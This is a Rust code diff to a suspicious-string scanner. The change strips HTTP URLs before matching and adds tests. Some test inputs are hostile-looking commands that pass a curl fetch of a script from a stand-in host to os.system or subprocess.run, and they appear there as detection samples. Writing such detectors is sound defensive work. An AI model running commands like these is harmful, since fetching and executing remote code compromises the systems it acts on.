@@ -5,6 +5,7 @@ use crate::strings_policy::{
     MODULE_ATTR_PATTERNS, PICKLE_LOADER_NEEDLES, SIMPLE_SUBSTRING_PATTERNS,
     SUBPROCESS_CALL_NEEDLES,
 };
+use std::borrow::Cow;
 
 const MAX_SUFFIX_CALL_LOOKAHEAD_CHARS: usize = 256;
 
@@ -66,7 +67,8 @@ pub(crate) fn suspicious_string_matches(value: &str) -> Vec<String> {
         return Vec::new();
     }
 
-    let has_plain_seed = has_suspicious_ascii_seed(value.as_bytes());
+    let plain_value = strip_http_url_spans(value);
+    let has_plain_seed = has_suspicious_ascii_seed(plain_value.as_bytes());
     let has_encoded_seed = has_base64_dangerous_seed(value);
     if !has_plain_seed && !has_encoded_seed {
         return Vec::new();
@@ -80,10 +82,11 @@ pub(crate) fn suspicious_string_matches(value: &str) -> Vec<String> {
         return matches;
     }
 
-    let lower = value.to_ascii_lowercase();
-    if value.contains("__")
-        && contains_magic_method(value)
-        && !contains_only_common_dunder_metadata_literals(value)
+    let lower = plain_value.to_ascii_lowercase();
+    let plain = plain_value.as_ref();
+    if plain.contains("__")
+        && contains_magic_method(plain)
+        && !contains_only_common_dunder_metadata_literals(plain)
     {
         matches.push("magic method".to_string());
     }
@@ -132,7 +135,7 @@ pub(crate) fn suspicious_string_matches(value: &str) -> Vec<String> {
         matches.push("hex escape".to_string());
     }
     if lower.contains("getattr") {
-        let getattr_matches = find_getattr_matches(value);
+        let getattr_matches = find_getattr_matches(plain);
         for (target, label) in GETATTR_TARGET_PATTERNS {
             if getattr_matches.contains_target(target) {
                 matches.push((*label).to_string());
@@ -146,6 +149,89 @@ pub(crate) fn suspicious_string_matches(value: &str) -> Vec<String> {
         }
     }
     matches
+}
+
+fn strip_http_url_spans(value: &str) -> Cow<'_, str> {
+    let bytes = value.as_bytes();
+    let mut output: Option<String> = None;
+    let mut cursor = 0;
+
+    while let Some(relative_start) = find_http_url_start(&bytes[cursor..]) {
+        let start = cursor + relative_start;
+        let end = http_url_end(bytes, start);
+        if end <= start {
+            cursor = start + 1;
+            continue;
+        }
+        let stripped = output.get_or_insert_with(|| String::with_capacity(value.len()));
+        stripped.push_str(&value[cursor..start]);
+        stripped.push(' ');
+        cursor = end;
+    }
+
+    match output {
+        Some(mut stripped) => {
+            stripped.push_str(&value[cursor..]);
+            Cow::Owned(stripped)
+        }
+        None => Cow::Borrowed(value),
+    }
+}
+
+fn find_http_url_start(bytes: &[u8]) -> Option<usize> {
+    (0..bytes.len()).find(|index| {
+        bytes
+            .get(*index..index + 7)
+            .is_some_and(|candidate| ascii_eq_ignore_case(candidate, b"http://"))
+            || bytes
+                .get(*index..index + 8)
+                .is_some_and(|candidate| ascii_eq_ignore_case(candidate, b"https://"))
+    })
+}
+
+fn http_url_end(bytes: &[u8], start: usize) -> usize {
+    let mut end = start;
+    while end < bytes.len() && is_http_url_byte(bytes[end]) {
+        end += 1;
+    }
+    end
+}
+
+fn ascii_eq_ignore_case(candidate: &[u8], expected: &[u8]) -> bool {
+    candidate.len() == expected.len()
+        && candidate
+            .iter()
+            .zip(expected.iter())
+            .all(|(left, right)| left.eq_ignore_ascii_case(right))
+}
+
+fn is_http_url_byte(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric()
+        || matches!(
+            byte,
+            b'-' | b'.'
+                | b'_'
+                | b'~'
+                | b':'
+                | b'/'
+                | b'?'
+                | b'#'
+                | b'['
+                | b']'
+                | b'@'
+                | b'!'
+                | b'$'
+                | b'&'
+                | b'\''
+                | b'('
+                | b')'
+                | b'*'
+                | b'+'
+                | b','
+                | b';'
+                | b'='
+                | b'%'
+        )
 }
 
 fn any_qualified_call_like(lower: &str, needles: &[&str]) -> bool {
@@ -1328,7 +1414,26 @@ mod tests {
         assert!(suspicious_string_matches("An import statement loads a module").is_empty());
         assert!(suspicious_string_matches(r"The bytes are written as \x80 in docs").is_empty());
         assert!(suspicious_string_matches("https://example.invalid/os.system").is_empty());
+        assert!(
+            suspicious_string_matches("https://example.invalid/docs/os.system(command)").is_empty()
+        );
+        assert!(
+            suspicious_string_matches("https://example.invalid/api/subprocess.run(args)")
+                .is_empty()
+        );
         assert!(suspicious_string_matches("__reduce__ is a pickle protocol hook").is_empty());
+    }
+
+    #[test]
+    fn suspicious_string_matching_preserves_code_around_url_literals() {
+        assert!(
+            suspicious_string_matches("os.system('curl https://example.invalid/p.sh')")
+                .contains(&"os.system".to_string())
+        );
+        assert!(suspicious_string_matches(
+            "subprocess.run(['curl', 'https://example.invalid/p.sh'])"
+        )
+        .contains(&"subprocess call".to_string()));
     }
 
     #[test]
